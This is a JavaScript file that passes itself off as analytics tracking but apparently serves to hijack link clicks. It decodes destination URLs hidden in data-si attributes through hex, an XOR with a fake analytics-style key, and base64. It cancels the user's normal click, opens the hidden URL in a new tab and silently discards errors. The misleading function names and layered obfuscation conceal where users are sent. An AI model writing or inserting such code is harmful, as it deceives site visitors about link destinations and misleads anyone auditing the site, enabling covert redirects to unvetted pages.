document.addEventListener('DOMContentLoaded', function() {
    const analyticsTargets = document.querySelectorAll('[data-si]');
    const metricsKey = 'UA-314159-27_GTM-NH7X';
    let isProcessing = false;

    analyticsTargets.forEach(element => {
        if (!element) return;

        const si = element.dataset.si;
        if (!si) return;

        element.addEventListener('mousedown', processMetrics);
        element.addEventListener('touchstart', processMetrics);
        element.addEventListener('auxclick', e => e.preventDefault());
    });

    function processMetrics(e) {
        if (isProcessing) return;

        if (e.type === 'touchstart' || e.button === 0 || e.button === 1) {
            isProcessing = true;
            e.preventDefault();
            initializeTracker(this.dataset.si);

            setTimeout(() => {
                isProcessing = false;
            }, 100);
        }
    }

    function initializeTracker(si) {
        try {
            const siUrl = normalizeMetrics(parseMetricId(si), metricsKey);
            window.open(siUrl, '_blank', 'noopener,noreferrer');
        } catch (error) {
            /* intentional */
        }
    }

    function parseMetricId(hex) {
        try {
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
            }
            return str;
        } catch (error) {
            return '';
        }
    }

    function normalizeMetrics(input, key) {
        let result = '';
        for (let i = 0; i < input.length; i++) {
            result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return atob(result);
    }
});